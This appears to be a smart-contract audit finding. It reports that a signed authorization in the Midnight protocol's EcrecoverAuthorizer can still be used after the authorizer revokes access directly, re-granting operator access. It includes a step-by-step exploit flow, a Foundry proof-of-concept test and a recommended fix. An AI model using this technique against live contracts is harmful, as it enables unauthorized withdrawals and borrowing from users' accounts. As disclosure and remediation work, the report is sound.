### Title
Pending EcrecoverAuthorizer signed authorization survives direct Midnight revocation, enabling re-grant of access after revocation - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer` maintains its own `nonce` counter that is entirely decoupled from Midnight's `isAuthorized` state. When A revokes B directly via `midnight.setIsAuthorized(B, false, A)`, the `ecrecoverAuthorizer.nonce[A]` is not incremented, leaving any previously signed `Authorization{isAuthorized=true, nonce=N}` still consumable. Because `EcrecoverAuthorizer.setIsAuthorized` is permissionless (any caller may submit a valid signed authorization), B or any attacker holding the signed message can re-grant B's access at any time before the deadline, overriding A's revocation.

### Finding Description

**Code path:**

`EcrecoverAuthorizer.setIsAuthorized` ( [1](#0-0) ) performs three checks before writing state:

1. `block.timestamp <= authorization.deadline` — deadline guard only. [2](#0-1) 
2. `authorization.nonce == nonce[authorization.authorizer]++` — sequential nonce consumed from `EcrecoverAuthorizer`'s own storage. [3](#0-2) 
3. Signature must recover to `authorization.authorizer` or a Midnight-authorized delegate. [4](#0-3) 

Then it calls: [5](#0-4) 

`Midnight.setIsAuthorized` checks only `onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender]`. [6](#0-5) 

**Root cause:**

`Midnight.setIsAuthorized(B, false, A)` — the direct revocation path — writes only to `isAuthorized[A][B]`. It does not touch `ecrecoverAuthorizer.nonce[A]`. [7](#0-6)  The nonce in `EcrecoverAuthorizer` is a separate, independent counter. [8](#0-7) 

**Exploit flow:**

Preconditions:
- `midnight.isAuthorized[A][EcrecoverAuthorizer] = true` (A pre-authorized the contract)
- `ecrecoverAuthorizer.nonce[A] = N`
- Attacker holds a valid signed `Authorization{authorizer=A, authorized=B, isAuthorized=true, nonce=N, deadline=T}` with `T > block.timestamp`

Step 1 — A revokes B directly:
```
midnight.setIsAuthorized(B, false, A)
  → isAuthorized[A][B] = false
  → ecrecoverAuthorizer.nonce[A] unchanged (still N)
  → isAuthorized[A][EcrecoverAuthorizer] unchanged (still true)
```

Step 2 — Attacker (or B) submits the signed authorization after A's revocation confirms:
```
EcrecoverAuthorizer.setIsAuthorized(
  Authorization{A, B, true, N, T},
  sig_A
)
  → deadline check: T > block.timestamp ✓
  → nonce check: N == nonce[A]++ ✓  (nonce was never consumed by A's direct call)
  → signer == A ✓
  → calls midnight.setIsAuthorized(B, true, A)
      → isAuthorized[A][EcrecoverAuthorizer] = true ✓
      → isAuthorized[A][B] = true  ← revocation overridden
```

**Why existing checks fail:**

The nonce guard only prevents replay of the *same* nonce twice within `EcrecoverAuthorizer`. It does not bind the nonce to Midnight's authorization state. A's direct revocation is invisible to `EcrecoverAuthorizer`. The `testEcrecoverAuthorizerPermissionless` test explicitly confirms any caller may submit a valid signed authorization — no `msg.sender` restriction exists. [9](#0-8) 

The question frames this as a front-run, but the attack is actually a **back-run or delayed submission**: the attacker does not need to monitor the mempool at all. They simply wait for A's revocation to confirm and then submit the signed authorization at any point before `deadline=T`.

A cannot pre-emptively invalidate the signed authorization via `midnight.setIsAuthorized` because that function does not touch `EcrecoverAuthorizer.nonce`. The only way to burn nonce N is to call `EcrecoverAuthorizer.setIsAuthorized` with a signed authorization at nonce N — but this requires A to know B holds the signed message, sign a new authorization, and race B to submit it.

### Impact Explanation

B retains or regains full operator access to A's Midnight account after A's explicit revocation. With `isAuthorized[A][B] = true`, B can call any `onBehalf=A` function: `withdraw`, `withdrawCollateral`, `borrow` (via `take`), `repay`, `setConsumed`, and `setIsAuthorized` for further delegation. This constitutes unauthorized borrowing, withdrawal, and collateral seizure on A's account.

### Likelihood Explanation

Preconditions are realistic: `EcrecoverAuthorizer` is the standard off-chain signing flow; any user who has ever shared a signed authorization (e.g., for a DApp session) and later tries to revoke access via a direct Midnight call is vulnerable. The attacker needs only the signed message (which may have been broadcast publicly or stored by a DApp) and the ability to submit a transaction before the deadline. No privileged access, oracle manipulation, or user mistake is required. The attack is repeatable for every signed authorization that has not yet been consumed.

### Recommendation

Add a function to `EcrecoverAuthorizer` that allows the authorizer to invalidate their current nonce without applying any authorization change — e.g.:

```solidity
function invalidateNonce() external {
    nonce[msg.sender]++;
    emit NonceInvalidated(msg.sender, nonce[msg.sender] - 1);
}
```

This allows A to atomically burn nonce N (and all lower nonces) in a single transaction, making any outstanding signed authorizations at that nonce invalid, without needing to sign a new authorization. Alternatively, document clearly that direct revocation via `midnight.setIsAuthorized` does **not** invalidate pending `EcrecoverAuthorizer` signatures, and that users must call `EcrecoverAuthorizer` to revoke when signed authorizations may be outstanding.

```solidity
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract FrontRunRevocationTest is BaseTest {
    function testRevocationBypassViaStaleSignedAuthorization() public {
        address A = borrower;   // authorizer
        address B = lender;     // operator to be revoked
        address attacker = makeAddr("attacker");

        // Precondition: A pre-authorizes EcrecoverAuthorizer in Midnight
        vm.prank(A);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, A);

        // A signs Authorization{A, B, true, nonce=0, deadline=far future}
        Authorization memory auth = Authorization({
            authorizer: A,
            authorized: B,
            isAuthorized: true,
            nonce: 0,
            deadline: block.timestamp + 365 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[A], digest);
        Signature memory sig = Signature({v: v, r: r, s: s});

        // A revokes B directly — does NOT increment ecrecoverAuthorizer.nonce[A]
        vm.prank(A);
        midnight.setIsAuthorized(B, false, A);
        assertEq(midnight.isAuthorized(A, B), false, "revocation should succeed");
        assertEq(ecrecoverAuthorizer.nonce(A), 0, "nonce must still be 0");

        // Attacker (or B) submits the stale signed authorization after revocation
        vm.prank(attacker);
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        // ASSERTION: B's access is re-granted — revocation bypassed
        assertEq(midnight.isAuthorized(A, B), true, "BUG: B has access after revocation");
        assertEq(ecrecoverAuthorizer.nonce(A), 1);
    }
}
```

Expected: final `assertEq(midnight.isAuthorized(A, B), true)` passes, proving B holds unauthorized persistent access after A's explicit revocation.

```text
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
```
